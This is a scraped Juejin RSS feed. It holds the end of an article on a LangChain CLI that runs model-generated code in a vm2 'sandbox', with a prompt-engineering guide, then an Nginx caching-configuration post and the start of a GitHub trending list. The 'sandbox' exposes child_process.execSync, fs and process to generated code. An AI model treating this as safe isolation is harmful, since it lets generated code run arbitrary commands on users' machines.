<h4 data-id="heading-40">7.7 沙箱环境与执行引擎</h4>
<ul>
<li><strong>环境定义</strong>（<code>src/bin/langchain/sandbox/common.ts</code>）：<strong>createSandbox(workspaceRoot)</strong> 返回一个对象，包含 <strong>vm2</strong> 所需的 <strong>sandbox</strong> 全局变量——如 <code>__workspace</code>、<code>fs</code>/<code>path</code>/<code>process</code>/<code>os</code>/<code>Buffer</code>/<code>util</code>/<code>console</code>/<code>URL</code>、<code>Promise</code>/<code>setTimeout</code>、<code>Koa</code>/<code>koaRouter</code>、<code>child_process.execSync</code>/<code>spawnSync</code>，以及便捷方法 <strong>createFile / readFile / listDir / rename / remove / copy / move / stat / listFilesRecursive / globFiles / requireFromWorkspace</strong> 等。路径未指定时默认为当前命令行所在目录（即 <code>__workspace</code>）。</li>
<li><strong>执行</strong>（<code>src/bin/langchain/sandbox/index.ts</code>）：使用 <strong>vm2</strong> 的 <code>VM</code>，把上述 sandbox 对象传入；为支持「顶层 return」，将用户代码包成 <strong>IIFE</strong> 再执行：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> wrapped = <span class="hljs-string">`(function() {\n<span class="hljs-subst">${code}</span>\n})()`</span>;
<span class="hljs-keyword">const</span> result = vm.<span class="hljs-title function_">run</span>(wrapped);
<span class="hljs-keyword">return</span> result <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Promise</span> ? <span class="hljs-keyword">await</span> result : result;
</code></pre>
<p>这样生成的代码里可以直接 <code>return ...</code>，返回值会交给命令层展示；若 return 的是 Promise，会 await 后再返回。</p>
<ul>
<li><strong>提示词与 API 说明</strong>（<code>src/bin/langchain/sandbox/prompt.ts</code>）：<strong>SANDBOX_SCHEMA</strong> 描述沙箱内所有全局对象和函数的类型、参数、示例；<strong>getSandboxPromptMarkdown()</strong> 将其转成 Markdown 表格和列表，注入到 <code>SANDBOX_SYSTEM_PROMPT</code>，使模型只使用这些 API 生成代码，避免使用未暴露的 Node 或浏览器 API。</li>
</ul>
<h4 data-id="heading-41">7.8 小结</h4>





























<table><thead><tr><th>模块</th><th>作用</th></tr></thead><tbody><tr><td><strong>sandbox 命令</strong></td><td>解析 <code>st sandbox &lt;指令&gt;</code>，用调度 Agent + bindTools 在 <code>sandbox</code> / <code>direct_answer</code> 间选择，并循环处理 tool_calls，直到模型不再调用工具；检测 HTTP 服务标记后挂起进程。</td></tr><tr><td><strong>sandboxTool</strong></td><td>根据用户指令调用模型生成沙箱代码 → Acorn 校验 → runInSandbox 执行 → 将结果或错误以 ToolMessage 形式返回。</td></tr><tr><td><strong>answerTool</strong></td><td>纯问答时由模型填入 answer，原样返回给用户。</td></tr><tr><td><strong>createSandbox / runInSandbox</strong></td><td>提供 vm2 沙箱全局环境（含 Node 与便捷文件 API），IIFE 包裹执行并支持 return/Promise。</td></tr><tr><td><strong>prompt 与 SANDBOX_SCHEMA</strong></td><td>把沙箱能力描述成 Markdown/JSON，约束模型只生成合规、可执行的代码。</td></tr></tbody></table>
<p>整体上，这就是一个「<strong>自然语言 → 调度 Agent（Tool 二选一）→ 沙箱工具内再调模型生成代码 → 语法校验 → vm2 执行 → 结果回传</strong>」的闭环，用到的 LangChain 概念包括 <strong>Tool、bindTools、SystemMessage/HumanMessage/AIMessage/ToolMessage、model.invoke</strong>，对应官网 <a href="https://link.juejin.cn?target=https%3A%2F%2Fjs.langchain.com%2Fdocs%2Fconcepts%2Ftools%2F" target="_blank" title="https://js.langchain.com/docs/concepts/tools/" ref="nofollow noopener noreferrer">Tools</a> 与 <a href="https://link.juejin.cn?target=https%3A%2F%2Fjs.langchain.com%2Fdocs%2Fconcepts%2Fmessages%2F" target="_blank" title="https://js.langchain.com/docs/concepts/messages/" ref="nofollow noopener noreferrer">Messages</a> 的用法。</p>
<hr/>
<h3 data-id="heading-42">八、提示词工程：如何写好提示词</h3>
<p>前面提到的编排、RAG、沙箱等，最终都要通过「<strong>和模型说清楚要做什么</strong>」才能生效，这部分就是<strong>提示词工程（Prompt Engineering）</strong>。下面用通俗方式说明其重要性，并给出一套可落地的书写原则，便于在业务里统一规范、减少无效调用。</p>
<h4 data-id="heading-43">8.1 为什么提示词重要</h4>
<p>模型本身不会「主动知道」业务规则、输出格式或边界条件，这些都需要通过**输入文本（提示词）**显式告诉它。提示词写得好，模型更容易：</p>
<ul>
<li><strong>做对事</strong>：理解任务意图、约束和优先级，减少答非所问或越权行为。</li>
<li><strong>出对格式</strong>：便于下游解析（如 JSON、表格、代码块），减少二次清洗。</li>
<li><strong>控制成本与延迟</strong>：约束长度、禁止冗长解释，有利于 token 与响应时间可控。</li>
</ul>
<p>因此，<strong>提示词是连接「业务需求」和「模型能力」的接口</strong>；写好提示词，是落地 AI 功能时性价比很高的投入。</p>
<h4 data-id="heading-44">8.2 如何写好提示词：几条可操作原则</h4>
<p>归纳为<strong>角色、任务、约束、格式、示例</strong>五类要素，按需组合即可。</p>



































<table><thead><tr><th>要素</th><th>说明</th><th>示例（一句话）</th></tr></thead><tbody><tr><td><strong>角色</strong></td><td>让模型进入「谁在说话」的设定，行为更一致</td><td>「你是调度助手」「你是只生成代码的沙箱执行器」</td></tr><tr><td><strong>任务</strong></td><td>用一句话说清「要干什么」，避免模糊</td><td>「根据用户输入决定调用 sandbox 还是 direct_answer」「生成可在沙箱中执行的 JavaScript」</td></tr><tr><td><strong>约束</strong></td><td>明确「不能做什么」「必须怎么做」，减少越界</td><td>「只输出代码，不要解释」「只能使用上文列出的全局对象」「回答控制在 1～3 句话」</td></tr><tr><td><strong>格式</strong></td><td>规定输出形态，方便解析与展示</td><td>「返回 JSON」「用```js ... ``` 包住代码」「若启动 HTTP 服务请在代码块后写 <strong>IS_HTTP_SERVICE</strong>」</td></tr><tr><td><strong>示例</strong></td><td>给 1～2 个输入输出样例，大幅提升格式与风格一致性</td><td>「输入：生成 index.html → 输出：仅一段可执行代码」</td></tr></tbody></table>
<p><strong>书写习惯建议</strong>：</p>
<ul>
<li><strong>先写「角色 + 任务」</strong>，再补约束和格式，最后需要时加示例。</li>
<li><strong>一条提示词只服务一个目标</strong>：调度就只做调度，生成代码就只生成代码，避免混在一起导致模型「不知道该优先听哪句」。</li>
<li><strong>关键规则用加粗或编号</strong>，便于模型注意（如「<strong>只调用一个工具</strong>」「3. 只输出代码」）。</li>
<li><strong>迭代优化</strong>：用真实用例跑几轮，看模型常犯的错误（漏约束、格式乱、话太多），再回头改提示词补一句、减一句。</li>
</ul>
<h4 data-id="heading-45">8.3 本文中的提示词实践（对应关系）</h4>
<ul>
<li><strong>调度提示词</strong>（七、沙箱插件）<strong>角色</strong>：调度助手。<strong>任务</strong>：根据用户输入决定调用 <code>sandbox</code> 还是 <code>direct_answer</code>。<strong>约束</strong>：只调用一个工具、不要长篇大论。这样模型就不会既调工具又自己啰嗦一大段。</li>
<li><strong>沙箱代码生成提示词****角色</strong>：沙箱内代码生成器。<strong>任务</strong>：根据用户指令生成可在给定沙箱中执行的 JavaScript。<strong>约束</strong>：只使用列出的 API、默认目录为 <code>__workspace</code>、启动服务时标注 <code>__IS_HTTP_SERVICE__</code>。<strong>格式</strong>：可包在 ```js ... ``` 里或裸代码。<strong>示例</strong>：通过 SANDBOX_SCHEMA / Markdown 表格把「有哪些函数、怎么用」写清楚，等于给了结构化示例。</li>
<li><strong>温度（二、认识模型）</strong>
温度虽不是「一句话提示词」，但属于<strong>同一类控制</strong>：通过参数告诉模型「要更确定还是更发散」。代码/结构化输出用低温度，创意类用稍高温度，本质上也是在「写好」对模型的行为约束。</li>
</ul>
<h4 data-id="heading-46">8.4 参照：业务中使用的提示词示例</h4>
<p>下面摘录并整理业务里实际用过的提示词，作为「角色 + 任务 + 约束 + 格式 + 示例」的参照，便于对照前文原则做迭代。</p>
<h5 data-id="heading-47">示例一：生成管理后台页面的 Prompt（低代码 / 运营者模块）</h5>
<p><strong>角色/任务</strong>：让 AI 在「30% 框架内」生成管理后台页面代码，而非凭空创新；需求边界、数据格式、交互范式由人工先锁定。</p>
<p><strong>约束与格式</strong>（节选）：</p>
<ul>
<li><strong>1.1 顶部导航栏</strong>：用 el-menu，背景色 #409EFF，文字白色，选中时背景加深 10%；左侧预留项目名称插槽（slot="brand"）；中间菜单项通过数组 NavItems 注入，结构 <code>NavItem { name, route, icon? }</code>；暴露事件 @select、@menu-click。Store 的 module 划分、state 形状、mutation 名由人工先锁定，AI 只生成具体 CRUD 逻辑。</li>
<li><strong>1.2 左侧列表区块</strong>：点击高亮用 class 切换（.is-active）；中间内容区 flex:1 自适应。</li>
<li><strong>1.3 左上角按钮组</strong>：添加按钮 el-button + Plus 图标、文字「新增」；搜索框 el-input + Search 图标，v-model 绑定 keyword，触发 @search。</li>
<li><strong>1.4 列表实现</strong>：字段校对由人工完成；AI 直接生成固定列数的 el-table，给出 <code>&lt;el-table-column&gt;</code> 骨架，prop 与后端字段保持一致。</li>
<li><strong>1.5 封装 ListTable 组件</strong>：外部传入 columns: <code>{ key, label, width?, slot? }[]</code>；内部维护 rendererMap，按 column.key 映射渲染函数；插槽命名规则 <code>table-[key]</code>，如 <code>&lt;template #table-status&gt;</code>。</li>
</ul>
<p><strong>要点</strong>：把「要生成什么、用什么组件、数据结构长什么样」写清楚，模型在给定框架内填代码，便于后续人工校对和联调。</p>
<h5 data-id="heading-48">示例二：AI 提升学习能力（设计模式 + 注释 + 单测）</h5>
<p><strong>角色/任务</strong>：用 AI 把「查文档 + 写样板」的时间省下来，在较短时间内给出「带设计模式 + 注释 + 单测模板」的高可维护代码。</p>
<p><strong>约束</strong>：先指定设计模式（如 Strategy、Factory、Observer）；要求 AI 生成 TypeScript 实现，并逐行补充 JSDoc 与单测用例；对存量代码，可让 AI 按相同模式做渐进式重构，人工只做 Code Review。</p>
<h5 data-id="heading-49">示例三：LangChain 调研结论（Function Calling / Multi-Agent / MCP）</h5>
<ul>
<li><strong>Function Calling</strong>：本地预注册函数，LLM 仅返回 JSON 参数；本地框架负责反射调用。LLM 本身不拥有、也不执行函数——它只是「点名 + 传参」。</li>
<li><strong>Multi-Agent 协作</strong>：同一进程内可启多个 Agent 实例，每个实例 system prompt 只聚焦单一职责（产品、开发、测试）；通过消息队列顺序传递上下文，降低单 Agent 的上下文长度与幻觉概率。</li>
<li><strong>MCP（Model Context Protocol）</strong>：统一「工具描述 + 调用」协议，Agent 通过 MCP 把工具清单发给 LLM，LLM 按 MCP 格式返回调用指令，本地 SDK 再执行真正的 Function Calling。类比：Agent 是顾客，MCP 是菜单 + 点单协议，Function Calling 是后厨实际炒菜。</li>
</ul>
<h5 data-id="heading-50">示例四：智能汇总 diff 生成 commit（工作流描述）</h5>
<p><strong>整体流程</strong>（一页讲解用）：获取 diff 信息 → 使用 LangChain 的 TokenTextSplitter 将文本切分为约 1500 大小的块 → Agent 对片段并发处理、AI 总结 → 将每个片段的结果再喂给 AI，生成 JSON（generalize 描述文本、commitMsg 标准化 commit 信息）→ 命令行确认后提交。</p>
<p><strong>分步要点</strong>：</p>
<ol>
<li>使用 git 获取 diff 信息。</li>
<li>使用 LangChain 的 TokenTextSplitter 将文本切分为约 1500 大小的模块。<strong>为什么要切分</strong>：一次数据量过大，直接丢给 Agent 生成速度慢；切分为 chunk 后通过 Promise.all 并发请求，减少等待时间。<strong>为什么不选 RAG/向量库</strong>：仅对 diff 做一次性汇总，先存向量库再检索过重，不适合。</li>
<li>用提示词让 AI 对非代码片段做文字性总结，对代码片段读取函数名并生成函数简述，收集成数组。</li>
<li>将多个片段汇总后的结果再作为提示词传入 AI，数据量小且能通过类型区分「代码」与「描述性文本」。</li>
<li>让 AI 用该数组生成一个 JSON：<code>generalize</code> 为描述整体的数组（展示为详细项），<code>commitMsg</code> 为标准化 commit 结果；后续用函数确认并调用 git 提交。</li>
</ol>
<p>以上示例可作为撰写「角色、任务、约束、格式、示例」时的参照，按业务场景裁剪即可。</p>
<h4 data-id="heading-51">8.5 小结</h4>
<p><strong>提示词工程</strong>就是把「要模型做什么、不能做什么、输出长什么样」说清楚；用好<strong>角色、任务、约束、格式、示例</strong>五类要素，并在实际用例上小步迭代，就能在少改代码的前提下，明显提升模型输出的可用性和稳定性。我们在调度、沙箱、RAG 等环节都已经按这套思路在写提示词，后续新功能也可以沿用同一套规范。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Nginx动静分离实战：性能提升100倍关键！]]></title>    <link>https://juejin.cn/post/7602154088476868646</link>    <guid>https://juejin.cn/post/7602154088476868646</guid>    <pubDate>2026-02-03T03:32:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602154088476868646" data-draft-id="7602303923139821618" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Nginx动静分离实战：性能提升100倍关键！"/> <meta itemprop="keywords" content="运维"/> <meta itemprop="datePublished" content="2026-02-03T03:32:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户525863386919"/> <meta itemprop="url" content="https://juejin.cn/user/4482058220739752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Nginx动静分离实战：性能提升100倍关键！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4482058220739752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户525863386919
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:32:11.000Z" title="Tue Feb 03 2026 03:32:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近看了一个帖子，把踩过的坑，给大家说下，</p>
<pre><code class="hljs language-server" lang="server">        listen 8081;
        #listen       443 ssl;
        server_name _;

#        ssl_certificate      /opt/cert/ssl/yunbei.yanjiamall.cn.pem;
#        ssl_certificate_key  /opt/cert/ssl/yunbei.yanjiamall.cn.key;

        ssl_session_cache    shared:SSL:1m;
        ssl_session_timeout  5m;

        ssl_ciphers  HIGH:!aNULL:!MD5;
        ssl_prefer_server_ciphers  on;
        #静态资源：正则匹配后直接读取本地目录
        location ~* \.(gif|jpg|jpeg|png|css|js|ico|svg|woff|woff2|ttf|eot)$ {
            root /opt/front/h5/h5/; # 新增这一行，指定静态文件实际目录
            expires 7d;
            add_header Cache-Control "public, max-age=604800, no-transform";
            try_files $uri =404;
        }

        location / {
            root /opt/front/h5/h5;
            index  index.html index.htm;
            try_files $uri $uri/ /index.html;
        }
        location /app-api/ {
             proxy_redirect off;
             proxy_set_header Host $host;
             proxy_set_header X-Real-IP $remote_addr;
             proxy_set_header X-Forward-For $proxy_add_x_forwarded_for;
             proxy_set_header X-Scheme $scheme;
             proxy_pass http://127.0.0.1:58082;
        }

}

</code></pre>
<p>第一个坑，你配置好时，在想怎么验证呢？我看到帖子没有写，于是去AI搜索下，给出下面答案</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa643012e19a4971ab20bcffdb036674~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NTI1ODYzMzg2OTE5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770694333&amp;x-signature=LSHiH3PFzURcTddRLulnwSd7nsk%3D" alt="image.png" loading="lazy"/>
然后第一步基础配置语法检查是没有问题的
但是在【浏览器开发者工具（最直观）】没有找到
于是乎有出现下面的内容</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/947ab5d2ae3b4988a7eec3b7253625be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NTI1ODYzMzg2OTE5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770694333&amp;x-signature=94KUJBeYy%2FuAjsqQ1NjwhMBXAow%3D" alt="image.png" loading="lazy"/>
第二个坑，但是浏览器还是没出现<code>Cache-Control</code> 和 <code>Expires</code> 缓存头
于是乎把nginx重启，命令如下</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4fde32b347b44a70ac8cecc4dc2fe15e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NTI1ODYzMzg2OTE5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770694333&amp;x-signature=ZYGais2pQKM8PEz3nATH6G71QZw%3D" alt="image.png" loading="lazy"/>
发现启动有问题，就进行一下命令</p>
<pre><code class="hljs language-#" lang="#">pkill -f nginx 
# 手动指定 PID 文件路径启动 
Nginx nginx -c /etc/nginx/nginx.conf -p /run/ 
# 或者直接重新启动服务 
systemctl restart nginx
</code></pre>
<p>第三个坑，但是浏览器还是没出现<code>Cache-Control</code> 和 <code>Expires</code> 缓存头
于是乎，想到了用无痕式打开网址
好了好了</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0e8d0a65b344d148103c0cd139b777d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NTI1ODYzMzg2OTE5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770694333&amp;x-signature=jvfncD1os3cI9HxWq2ebVjxVk78%3D" alt="image.png" loading="lazy"/>
有写的不好，或者有其他问题，欢迎大家留言，点赞，马年发大财~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 2026 年 1 月 GitHub 十大热门项目排行榜 🔥]]></title>    <link>https://juejin.cn/post/7602191709388292138</link>    <guid>https://juejin.cn/post/7602191709388292138</guid>    <pubDate>2026-02-03T03:01:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602191709388292138" data-draft-id="7602259669729919003" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀 2026 年 1 月 GitHub 十大热门项目排行榜 🔥"/> <meta itemprop="keywords" content="GitHub,人工智能,前端"/> <meta itemprop="datePublished" content="2026-02-03T03:01:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一点一木"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986187486"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀 2026 年 1 月 GitHub 十大热门项目排行榜 🔥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986187486/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一点一木
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:01:06.000Z" title="Tue Feb 03 2026 03:01:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body 